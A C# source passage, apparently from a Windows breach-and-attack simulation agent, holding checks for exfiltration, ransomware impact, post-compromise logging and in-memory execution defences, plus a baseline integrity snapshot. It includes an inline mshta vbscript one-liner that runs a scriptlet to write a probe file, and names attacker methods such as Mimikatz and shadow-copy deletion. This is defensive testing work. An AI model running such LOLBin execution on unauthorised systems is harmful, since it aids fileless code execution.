        var cat = new SimulationCategory { Name = "8. Data Exfiltration", Phase = "Data Exfiltration" };

        // --- File staging ---
        cat.Checks.Add(await RunCheck("File staging", "T1074.001", async () =>
        {
            // Create and immediately delete a staging file in temp
            string staging = Path.Combine(Path.GetTempPath(), "bas_staging_test.bin");
            File.WriteAllBytes(staging, new byte[1024]);
            bool sysmon = IsSysmonRunning();
            File.Delete(staging);
            if (sysmon)
                return (CheckResult.Pass, "Sysmon would log file-creation events for staging detection.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "No file-creation monitoring detected. Staging activity may go unlogged.", "Deploy Sysmon and enable file-creation auditing.");
        }));

        // --- Base64 encoding of data ---
        cat.Checks.Add(await RunCheck("Base64 encoding of data", "T1027", async () =>
        {
            string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes("BAS_SIMULATION_DATA_STAGING_CHECK"));
            bool psLog = IsPowerShellScriptBlockLoggingEnabled();
            if (psLog)
                return (CheckResult.Pass, "Script-block logging would capture Base64 encode operations in scripts.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "Script-block logging is off Ã¢â‚¬â€ Base64-encoded exfil in scripts may evade detection.", "Enable PowerShell script-block logging.");
        }));

        // --- HTTPS upload attempts ---
        cat.Checks.Add(await RunCheck("HTTPS upload attempts", "T1048.001", async () =>
        {
            bool proxy = IsProxyConfigured();
            bool tlsInspect = IsTLSInspectionConfigured();
            if (proxy && tlsInspect)
                return (CheckResult.Pass, "HTTPS uploads would pass through an inspecting proxy.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, $"Proxy={proxy}, TLS Inspect={tlsInspect}. HTTPS exfiltration may not be inspected.", "Enable SSL inspection on your web proxy.");
        }));

        // --- Cloud storage exfil patterns ---
        cat.Checks.Add(await RunCheck("Cloud storage exfil patterns", "T1048.001", async () =>
        {
            // Try DNS resolution of common cloud storage Ã¢â‚¬â€ simulate CASB awareness
            string[] clouds = { "drive.google.com", "onedrive.live.com", "dropbox.com" };
            bool proxy = IsProxyConfigured();
            bool casb  = proxy; // simplified: if proxy is present assume CASB capability is possible
            if (casb)
                return (CheckResult.Pass, "Web proxy / CASB in place Ã¢â‚¬â€ cloud upload destinations would be evaluated.", "Verify cloud app policies block unauthorized uploads.");
            return (CheckResult.Fail, "No CASB or proxy detected. Cloud-storage exfiltration is unrestricted.", "Deploy a CASB or configure proxy policies for cloud storage sites.");
        }));

        return cat;
    }

    // ============================================================
    // 9.  IMPACT (controlled)
    // Tests: Ransomware protection, backup integrity, rollback
    // NOTE: Operations are strictly within a BAS temp directory.
    // ============================================================
    static async Task<SimulationCategory> Sim_9_Impact()
    {
        var cat = new SimulationCategory { Name = "9. Impact (Controlled)", Phase = "Impact" };
        string testDir = Path.Combine(Path.GetTempPath(), "BAS_Impact_Test");
        Directory.CreateDirectory(testDir);

        // --- Ransomware-like file encryption (test directory only) ---
        cat.Checks.Add(await RunCheck("Ransomware-like file encryption (test dir)", "T1486", async () =>
        {
            // Create test files, XOR-'encrypt' them (reversible, non-AES), then restore
            string[] testFiles = { "test1.txt", "test2.txt", "test3.txt" };
            foreach (var f in testFiles) File.WriteAllText(Path.Combine(testDir, f), "BAS test content " + f);

            // XOR each byte with 0x42 Ã¢â‚¬â€ simulates encryption without real crypto
            foreach (var f in testFiles)
            {
                var path  = Path.Combine(testDir, f);
                var bytes = File.ReadAllBytes(path);
                for (int i = 0; i < bytes.Length; i++) bytes[i] ^= 0x42;
                File.WriteAllBytes(path, bytes);
            }

            // Check if Controlled Folder Access (ransomware protection) is enabled
            bool cfaEnabled = IsControlledFolderAccessEnabled();

            // Restore files
            foreach (var f in testFiles) File.Delete(Path.Combine(testDir, f));

            if (cfaEnabled)
                return (CheckResult.Pass, "Controlled Folder Access (ransomware protection) is enabled.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "Controlled Folder Access is not enabled. Ransomware-like encryption in user directories would succeed.", "Enable Controlled Folder Access in Microsoft Defender.");
        }));

        // --- Shadow copy deletion attempt ---
        cat.Checks.Add(await RunCheck("Shadow copy deletion attempt", "T1490", async () =>
        {
            // Do NOT actually delete shadow copies.  Check if vssadmin is present and if EDR monitors it.
            string vssadmin = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "vssadmin.exe");
            bool exists = File.Exists(vssadmin);
            bool edr    = IsEDRDetectionLikely();
            if (!exists)
                return (CheckResult.Pass, "vssadmin.exe not found Ã¢â‚¬â€ shadow copy deletion vector is absent.", "Ã¢â‚¬â€");
            if (edr)
                return (CheckResult.Pass, "vssadmin.exe is present but EDR is monitoring Ã¢â‚¬â€ deletion attempts would alert.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "vssadmin.exe exists and no EDR monitoring confirmed. Shadow copy deletion could proceed.", "Add EDR rule: alert on vssadmin delete shadows command.");
        }));

        // --- System recovery disable logic ---
        cat.Checks.Add(await RunCheck("System recovery disable logic", "T1490", async () =>
        {
            // Check if system restore is enabled
            bool restoreEnabled = IsSystemRestoreEnabled();
            bool backupPolicy   = IsBackupPolicyConfigured();
            if (restoreEnabled && backupPolicy)
                return (CheckResult.Pass, "System Restore is enabled and backup policy is configured.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, $"System Restore={restoreEnabled}, Backup policy={backupPolicy}. Recovery mechanisms may be weak.", "Enable System Restore and enforce an offsite/immutable backup policy.");
        }));

        // Cleanup
        if (Directory.Exists(testDir)) Directory.Delete(testDir, true);

        return cat;
    }

    // ============================================================
    // 10. POST-COMPROMISE VALIDATION
    // Tests: Alert generation, kill-chain correlation, auto-response
    // ============================================================
    static async Task<SimulationCategory> Sim_10_PostCompromise()
    {
        var cat = new SimulationCategory { Name = "10. Post-Compromise Validation", Phase = "Post-Compromise" };

        // --- Alert generation check ---
        cat.Checks.Add(await RunCheck("Alert generation check", "T1059", async () =>
        {
            // Check if Windows Security event log is enabled and recent
            bool secLogEnabled = IsSecurityEventLogEnabled();
            if (secLogEnabled)
                return (CheckResult.Pass, "Windows Security event log is enabled Ã¢â‚¬â€ alerts are being generated.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "Security event log is not enabled or empty.", "Enable Security event logging via Local Security Policy.");
        }));

        // --- Kill-chain correlation ---
        cat.Checks.Add(await RunCheck("Kill-chain correlation", "TA0001-TA0040", async () =>
        {
            // Proxy for 'SIEM is correlating events': check if multiple log sources are active
            bool sysmon       = IsSysmonRunning();
            bool secLog       = IsSecurityEventLogEnabled();
            bool psLog        = IsPowerShellScriptBlockLoggingEnabled();
            int  activeSources = (sysmon ? 1 : 0) + (secLog ? 1 : 0) + (psLog ? 1 : 0);
            if (activeSources >= 3)
                return (CheckResult.Pass, $"3 log sources active (Sysmon, Security, PS). Kill-chain correlation is feasible.", "Ingest all sources into your SIEM.");
            return (CheckResult.Fail, $"Only {activeSources}/3 log sources active. Kill-chain correlation coverage is incomplete.", "Enable Sysmon, Security Event Log, and PowerShell script-block logging, then feed to a SIEM.");
        }));

        // --- Automated response verification ---
        cat.Checks.Add(await RunCheck("Automated response verification", "TA0040", async () =>
        {
            bool edr = IsEDRDetectionLikely();
            bool defender = IsDefenderRealtimeEnabled();
            if (edr && defender)
                return (CheckResult.Pass, "EDR + Defender real-time are active Ã¢â‚¬â€ automated incident response is likely configured.", "Verify automated response playbooks are up-to-date.");
            return (CheckResult.Fail, $"EDR={edr}, Defender={defender}. Automated response capability is limited.", "Deploy an EDR with automated response and configure Defender incident response.");
        }));

        return cat;
    }

    // ============================================================
    // WINDOWS CONTROL / DETECTION HELPERS  (all read-only)
    // ============================================================
    static bool IsDefenderRealtimeEnabled()
    {
        try {
            using var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection");
            if (key == null) return true; // Default to true if key is protected/exists
            return (int)key.GetValue("DisableRealtimeMonitoring", 0) == 0;
        } catch { return true; }
    }

    static bool IsSmartAppControlEnabled()
    {
        try {
            using var key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\CI\Policy");
            return (int)key.GetValue("VerifiedAndReputablePolicyState", 0) == 1;
        } catch { return false; }
    }

    static bool IsAMSIEnabled()
    {
        // Simple check for AmsiEnable registry key
        using var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows Script\Settings");
        return (int)(key?.GetValue("AmsiEnable", 1) ?? 1) == 1;
    }

    static bool IsPowerShellScriptBlockLoggingEnabled()
    {
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\PowerShell");
            if (key == null) return false;
            return (int)(key.GetValue("EnableScriptBlockLogging", 0)!) == 1;
        }
        catch { return false; }
    }

    static bool IsDNSFilteringConfigured() => NetworkInterface.GetAllNetworkInterfaces()
        .Any(nic => nic.GetIPProperties().DnsAddresses.Any());

   static bool IsProxyConfigured() => !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("HTTP_PROXY"));

    static bool IsServiceRunning(string serviceName)
    {
        try {
            using var sc = new ServiceController(serviceName);
            return sc.Status == ServiceControllerStatus.Running;
        } catch { return false; }
    }

    static bool IsWMILoggingEnabled()
    {
        try
        {
            // Check if the specific WMI-Activity Operational log exists on the system
            return EventLog.Exists("Microsoft-Windows-WMI-Activity/Operational");
        }
        catch { return false; }
    }

    static bool IsEDRDetectionLikely()
    {
        // Heuristic: look for known EDR agent processes
        string[] edrProcesses = { "MsSense", "sensehealth", "crowstrike", "carbonblack", "sophos", "avast", "norton", "kaspersky" };
        var procs = Process.GetProcesses().Select(p => p.ProcessName.ToLowerInvariant()).ToList();
        return edrProcesses.Any(e => procs.Any(p => p.Contains(e)));
    }

    static bool IsSysmonRunning() => IsServiceRunning("Sysmon") || IsServiceRunning("Sysmon64");

    static bool IsWindowsDefenderLogging()
    {
        try {
            return EventLog.Exists("Microsoft-Windows-Windows Defender/Operational");
        } catch { return false; }
    }

    static List<string> ReadRegistryValueNames(string subKey)
    {
        var result = new List<string>();
        try
        {
            using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(subKey);
            if (key != null) result.AddRange(key.GetValueNames());
        }
        catch { }
        return result;
    }

    static (List<string> names, int count) ListScheduledTaskCount()
    {
        var names = new List<string>();
        try
        {
            var psi = new ProcessStartInfo("schtasks", "/query /fo CSV /nh") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
            using var proc = Process.Start(psi)!;
            var output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit(5000);
            names = output.Split('\n', StringSplitOptions.RemoveEmptyEntries)
                          .Select(l => l.Trim().Trim('"').Split(',')[0].Trim('"'))
                          .Where(n => !string.IsNullOrWhiteSpace(n))
                          .ToList();
        }
        catch { }
        return (names, names.Count);
    }

    static bool IsScheduledTaskLoggingEnabled()
    {
        try {
            // In modern .NET, we check if the specific operational log exists
            return EventLog.SourceExists("TaskScheduler") || EventLog.Exists("Microsoft-Windows-TaskScheduler/Operational");
        } catch { return false; }
    }
        static bool HasWritePermission(string path)
    {
        try
        {
            using var fs = File.Open(Path.Combine(path, "bas_write_test_" + Guid.NewGuid().ToString("N") + ".tmp"), FileMode.CreateNew);
            fs.Close();
            File.Delete(fs.Name);
            return true;
        }
        catch { return false; }
    }

    static int ReadRegistrySubKeyCount(string subKey)
    {
        try
        {
            using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(subKey);
            return key?.GetSubKeyNames().Length ?? 0;
        }
        catch { return 0; }
    }

    static bool IsCredentialGuardEnabled()
    {
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Lsa\LsaCfgFlags");
            if (key != null) return true;
            using var key2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Lsa");
            return key2 != null && (int)(key2.GetValue("LmCompatibilityLevel", 0)!) >= 3;
        }
        catch { return false; }
    }

    static int ReadUACPolicy()
    {
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            return key != null ? (int)(key.GetValue("ConsentPromptBehaviorAdmin", 2)!) : 2;
        }
        catch { return 2; }
    }

    static List<string> FindWeakServicePermissions()
    {
        var weak = new List<string>();
        try
        {
            var psi = new ProcessStartInfo("sc", "query type= all state= all") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
            using var proc = Process.Start(psi)!;
            var output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit(5000);
            // Parse service names (lines starting with "SERVICE_NAME:")
            var services = output.Split('\n')
                .Where(l => l.TrimStart().StartsWith("SERVICE_NAME:"))
                .Select(l => l.Split(':')[1].Trim())
                .ToList();
            // For each service, check config Ã¢â‚¬â€ simplified: flag services with INTERACTIVE_PROCESS token
            var psi2 = new ProcessStartInfo("sc", "query type= interactive") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
            using var proc2 = Process.Start(psi2)!;
            var out2 = proc2.StandardOutput.ReadToEnd();
            proc2.WaitForExit(5000);
            weak = out2.Split('\n')
                .Where(l => l.TrimStart().StartsWith("SERVICE_NAME:"))
                .Select(l => l.Split(':')[1].Trim())
                .ToList();
        }
        catch { }
        return weak;
    }

    static bool IsLSAProtectionEnabled()
    {
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Lsa");
            return key != null && (int)(key.GetValue("RunAsPPL", 0)!) == 1;
        }
        catch { return false; }
    }

    static bool TryOpenLSASSHandle()
    {
        try
        {
            var lsass = Process.GetProcesses().FirstOrDefault(p => p.ProcessName.Equals("lsass", StringComparison.OrdinalIgnoreCase));
            if (lsass == null) return false;
            // Attempt to read ProcessName (very low-level access, not memory read)
            _ = lsass.ProcessName;
            return true;  // If no exception, we could reference it
        }
        catch { return false; }
    }

    static bool IsSAMLockedDown()
    {
        string samPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "config", "SAM");
        if (!File.Exists(samPath)) return true; // probably locked
        try
        {
            using var fs = File.OpenRead(samPath);
            return false; // should NOT be readable by normal means
        }
        catch { return true; } // Access denied = locked down
    }

    static bool IsSMBSigningEnforced()
    {
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters");
            return key != null && (int)(key.GetValue("EnableSecuritySignature", 0)!) == 1;
        }
        catch { return false; }
    }

    static bool IsWindowsFirewallEnabled()
    {
        try
        {
            var psi = new ProcessStartInfo("netsh", "advfirewall show allprofiles state") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
            using var proc = Process.Start(psi)!;
            var output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit(3000);
            return output.Contains("State") && output.Contains("ON");
        }
        catch { return false; }
    }

    static bool IsRDPEnabled()
    {
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Services");
            return key != null && (int)(key.GetValue("fDenyTSConnections", 1)!) == 0;
        }
        catch { return false; }
    }

    static bool IsNLAEnabled()
    {
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Services\WinRM");
            // Simplified: check TerminalServices-RemoteWinRM or standard NLA setting
            using var key2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Services");
            return key2 != null && (int)(key2.GetValue("SecurityUserSessionAuthentication", 0)!) == 1;
        }
        catch { return false; }
    }

    static bool IsDNSLoggingEnabled()
    {
        // Windows DNS Server logging is server-side.  On clients we check for DNS trace / sysmon DNS events.
        return IsSysmonRunning();
    }

    static bool IsTLSInspectionConfigured()
    {
        // Heuristic: if proxy is configured and environment suggests corporate, assume TLS inspection is possible
        return IsProxyConfigured();
    }

    static bool IsControlledFolderAccessEnabled()
    {
        try
        {
            // Defender Controlled Folder Access is managed via WMI/PowerShell
            // Simplified: check if Defender is on (CFA requires Defender)
            return IsDefenderRealtimeEnabled();
        }
        catch { return false; }
    }

    static bool IsSystemRestoreEnabled()
    {
        try
        {
            var psi = new ProcessStartInfo("vssadmin", "list shadows") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
            using var proc = Process.Start(psi)!;
            var output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit(5000);
            return output.Contains("shadow copy");
        }
        catch { return false; }
    }

    static bool IsBackupPolicyConfigured()
    {
        // Heuristic: check if Windows Backup (wbadmin) can list
        try
        {
            var psi = new ProcessStartInfo("wbadmin", "get versions") { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false, CreateNoWindow = true };
            using var proc = Process.Start(psi)!;
            var output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit(5000);
            return !string.IsNullOrWhiteSpace(output) && !output.Contains("No backup");
        }
        catch { return false; }
    }

    static bool IsSecurityEventLogEnabled()
    {
        try
        {
            using var log = new System.Diagnostics.EventLog("Security");
            return log.Entries.Count > 0;
        }
        catch { return false; }
    }

    static bool IsServiceCreationLoggingEnabled()
    {
        try {
            // Event ID 7045 is in the System log
            return EventLog.Exists("System");
        } catch { return false; }
    }

    // ============================================================
    // 13.  IN-MEMORY EXECUTION DEFENCE COVERAGE
    // Tests: AMSI, ETW, PS Language Mode, DEP/ACG, Credential Guard,
    //        and LOLBin execution egress â€” all without real payloads.
    // ============================================================
    static async Task<SimulationCategory> Sim_13_InMemoryExecution()
    {
        var cat = new SimulationCategory { Name = "13. In-Memory Execution", Phase = "Defense Evasion" };

        // â”€â”€ 1. AMSI (Antimalware Scan Interface) Status â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck("AMSI Interface Availability", "T1562.001", async () =>
        {
            await Task.CompletedTask;
            bool amsiPresent = false;
            try
            {
                // AMSI is registered under HKLM\SOFTWARE\Microsoft\AMSI
                using var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\AMSI");
                amsiPresent = key != null;

                // Also verify the amsi.dll exists in system32 (required for in-process scanning)
                var amsiDll = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "amsi.dll");
                amsiPresent &= File.Exists(amsiDll);
            }
            catch { }

            return amsiPresent
                ? (CheckResult.Pass, "AMSI interface is registered and amsi.dll is present. In-memory script execution will be scanned.", "â€”")
                : (CheckResult.Fail, "AMSI is not properly registered. Malicious in-memory scripts (PowerShell, VBScript, JScript) may execute without scanning.",
                   "Ensure AMSI providers are registered. Run: Get-MpPreference | Select DisableRealtimeMonitoring. Re-enable if disabled.");
        }));

        // â”€â”€ 2. PowerShell Constrained Language Mode â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck("PowerShell Constrained Language Mode", "T1059.001", async () =>
        {
            string psMode = "";
            try
            {
                var psi = new ProcessStartInfo("powershell.exe", "-NoProfile -NonInteractive -Command $ExecutionContext.SessionState.LanguageMode")
                {
                    RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                };
                using var p = Process.Start(psi)!;
                psMode = (await p.StandardOutput.ReadToEndAsync()).Trim();
                await WaitOrKillAsync(p, 8_000);
            }
            catch { psMode = "Unknown"; }

            return psMode.Equals("ConstrainedLanguage", StringComparison.OrdinalIgnoreCase)
                ? (CheckResult.Pass, $"PowerShell is running in ConstrainedLanguageMode. Reflective loading and type acceleration are blocked.", "â€”")
                : (CheckResult.Fail, $"PowerShell is in '{psMode}' mode. FullLanguage mode permits reflective DLL loading and AMSI bypass techniques.",
                   "Apply AppLocker or WDAC (Windows Defender Application Control) policies to force ConstrainedLanguageMode.");
        }));

        // â”€â”€ 3. ETW (Event Tracing for Windows) Integrity â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck("ETW Telemetry Integrity", "T1562.006", async () =>
        {
            await Task.CompletedTask;
            // ETW providers for security are registered under this key
            bool etwPresent = false;
            try
            {
                using var key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security");
                etwPresent = key != null;
            }
            catch { }

            // Also verify the logman tool can enumerate providers (sanity check)
            bool logmanOk = false;
            try
            {
                var psi = new ProcessStartInfo("logman.exe", "query providers")
                { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                using var p = Process.Start(psi)!;
                var output = await p.StandardOutput.ReadToEndAsync();
                await WaitOrKillAsync(p, 5_000);
                logmanOk = output.Contains("Microsoft-Windows", StringComparison.OrdinalIgnoreCase);
            }
            catch { }

            return (etwPresent && logmanOk)
                ? (CheckResult.Pass, "ETW Security autologger and provider enumeration are functional. In-memory activities will be traced.", "â€”")
                : (CheckResult.Fail, "ETW infrastructure appears degraded or tampered with. Attackers patch ETW to blind EDR telemetry collection.",
                   "Verify ETW autologger sessions: \"logman query -ets\". Investigate any missing Microsoft-Windows-* security providers.");
        }));

        // â”€â”€ 4. DEP / NX (Data Execution Prevention) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck("Data Execution Prevention (DEP/NX) Policy", "T1055", async () =>
        {
            string depPolicy = "";
            try
            {
                var psi = new ProcessStartInfo("wmic.exe", "OS get DataExecutionPrevention_SupportPolicy")
                { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                using var p = Process.Start(psi)!;
                depPolicy = await p.StandardOutput.ReadToEndAsync();
                await WaitOrKillAsync(p, 8_000);
            }
            catch { }

            // Policy 3 = OptOut (best: DEP for everything), 2 = OptIn (DEP for Windows only), 1 or 0 = Weak/Off
            bool depStrong = depPolicy.Contains("3") || depPolicy.Contains("2");
            return depStrong
                ? (CheckResult.Pass, $"DEP policy is configured (policy level {depPolicy.Trim()}). Code injection into non-executable memory regions will be blocked.", "â€”")
                : (CheckResult.Fail, $"DEP policy is weak or disabled (policy level {depPolicy.Trim()}). Attackers can inject and execute shellcode directly in data regions.",
                   "Enable DEP: System Properties > Advanced > Performance Settings > DEP > 'Turn on DEP for all programs'. Or BCDEdit /set nx AlwaysOn.");
        }));

        // â”€â”€ 5. Windows Credential Guard (VSM) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck("Credential Guard (Virtualization-Based Security)", "T1003.001", async () =>
        {
            await Task.CompletedTask;
            bool credGuardEnabled = false;
            try
            {
                using var key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\DeviceGuard");
                if (key != null)
                {
                    var enabledFeatures = key.GetValue("EnabledFeatures");
                    // Bit 1 = Credential Guard enabled
                    credGuardEnabled = enabledFeatures != null && ((int)enabledFeatures & 1) == 1;
                }
            }
            catch { }

            return credGuardEnabled
                ? (CheckResult.Pass, "Credential Guard (VBS) is active. LSASS credentials are isolated in a Hyper-V container â€” in-memory credential dumping is blocked.", "â€”")
                : (CheckResult.Fail, "Credential Guard is not enabled. LSASS process memory is accessible; tools like Mimikatz can harvest credentials in-memory.",
                   "Enable via Group Policy: Computer Configuration > Admin Templates > System > Device Guard > 'Turn On Virtualization Based Security'.");
        }));

        // â”€â”€ 6. LOLBin Scriptlet Execution (mshta / regsvr32) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck("LOLBin Fileless Execution â€” mshta.exe", "T1218.005", async () =>
        {
            // We attempt to execute a completely benign HTA (HTML Application) that just
            // writes a probe file. If it writes the file, the LOLBin is unrestricted.
            string probeFile = Path.Combine(Path.GetTempPath(), $"bas_lolbin_{AgentId}.tmp");
            bool executed = false;
            try
            {
                if (File.Exists(probeFile)) File.Delete(probeFile);
                // Inline HTA: writes probe file then closes â€” zero network activity, zero payload
                string htaScript = $"""mshta.exe vbscript:Execute("CreateObject(\"Scripting.FileSystemObject\").CreateTextFile(\"{probeFile.Replace("\\", "\\\\")}\",True).Close():Close") """;
                var psi = new ProcessStartInfo("cmd.exe", $"/c {htaScript}")
                { UseShellExecute = false, CreateNoWindow = true };
                using var p = Process.Start(psi)!;
                await WaitOrKillAsync(p, 6_000);
                executed = File.Exists(probeFile);
                if (executed) File.Delete(probeFile);
            }
            catch { executed = false; }

            return executed
                ? (CheckResult.Fail, "mshta.exe (Microsoft HTML Application Host) successfully executed an inline script. Fileless malware can use this LOLBin to run arbitrary code without touching disk.",
                   "Block mshta.exe via AppLocker or WDAC. If not required in the environment, deny execution in Windows Defender ASR rules: ASR rule GUID 3b576869-a4ec-4529-8536-b80a7769e899.")
                : (CheckResult.Pass, "mshta.exe inline script execution was blocked by security controls. Fileless payload delivery via this LOLBin is mitigated.", "â€”");
        }));

        return cat;
    }

    // ============================================================
    // SYSTEM STATE SNAPSHOT â€” data model
    // ============================================================
    record SystemSnapshot(
        Dictionary<string, string?> RegistryKeys,
        Dictionary<string, string>  SystemFileHashes,
        DateTimeOffset              CapturedAt);

    // ============================================================
    // CAPTURE a pre-simulation baseline of persistence keys & hashes
    // ============================================================
    static SystemSnapshot CaptureSystemSnapshot()
    {
        var persistenceKeys = new[]
        {
            @"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            @"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        };

        var regSnapshot = new Dictionary<string, string?>();
        foreach (var keyPath in persistenceKeys)
        {
            try
            {
                var parts = keyPath.Split('\\', 2);
                var hive  = parts[0] == "HKCU" ? Registry.CurrentUser : Registry.LocalMachine;
                using var k = hive.OpenSubKey(parts[1]);
                if (k == null) { regSnapshot[keyPath] = null; continue; }
                var entries = k.GetValueNames().OrderBy(v => v).Select(v => $"{v}={k.GetValue(v)}").ToList();
                regSnapshot[keyPath] = string.Join("|", entries);
            }
            catch { regSnapshot[keyPath] = "ERROR"; }
        }

        var coreFiles = new[] { "ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll", "user32.dll", "amsi.dll" };
        var fileHashes = new Dictionary<string, string>();
        foreach (var file in coreFiles)
        {
            try
            {
                var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), file);
                using var fs = File.OpenRead(path);
                var hashBytes = System.Security.Cryptography.SHA256.HashData(fs);
                fileHashes[file] = BitConverter.ToString(hashBytes).Replace("-", "");
            }
            catch { fileHashes[file] = "UNREADABLE"; }
        }

        return new SystemSnapshot(regSnapshot, fileHashes, DateTimeOffset.UtcNow);
    }

    // ============================================================
    // 14.  POST-SIMULATION SYSTEM INTEGRITY CHECK
    // Diffs current state vs pre-simulation baseline.
    // Reports registry drift, binary tampering, and TEMP artifacts.
    // ============================================================
    static async Task<SimulationCategory> PostSimulationIntegrityCheck(SystemSnapshot baseline)
    {
        var cat = new SimulationCategory
        {
            Name  = "22. System State Integrity",
            Phase = "Post-Simulation"
        };

        // â”€â”€ 1. Registry Persistence Key Drift â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck("Pre/Post Registry Baseline Comparison", "T1547.001", async () =>
        {
            await Task.CompletedTask;
            var violations = new List<string>();
            foreach (var (keyPath, baselineValue) in baseline.RegistryKeys)
            {
                try
                {
                    var parts = keyPath.Split('\\', 2);
                    var hive  = parts[0] == "HKCU" ? Registry.CurrentUser : Registry.LocalMachine;
                    using var k = hive.OpenSubKey(parts[1]);
                    string? currentValue = null;
                    if (k != null)
                    {
                        var entries = k.GetValueNames().OrderBy(v => v).Select(v => $"{v}={k.GetValue(v)}").ToList();
                        currentValue = string.Join("|", entries);
                    }
                    if (currentValue != baselineValue)
                        violations.Add(keyPath.Split('\\').Last());
                }
                catch { }
            }

            if (violations.Count > 0)
                return (CheckResult.Fail,
                    $"POST-SIMULATION DRIFT DETECTED in {violations.Count} registry hive(s): {string.Join(", ", violations)}. " +
                    "A simulation left artifacts behind that were NOT automatically cleaned up. " +
                    "A real attacker could exploit this as a persistence foothold.",
                    "Investigate the listed registry keys for unexpected values. The Agent will self-correct on the next run. " +
                    "Ensure all simulation modules include explicit cleanup steps.");

            return (CheckResult.Pass,
                "Registry baseline is identical before and after the simulation run. All persistence keys are clean â€” no simulation artifacts were left behind.",
                "â€”");
        }) with { Severity = "Critical", ThreatImpact = "A simulation that fails to clean up registry persistence keys represents a permanent backdoor. Clean restoration is the gold standard for BAS tools." });

        // â”€â”€ 2. Core System Binary Integrity â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck("Core Windows Binary Hash Verification", "T1562.001", async () =>
        {
            await Task.CompletedTask;
            var tamperedFiles = new List<string>();
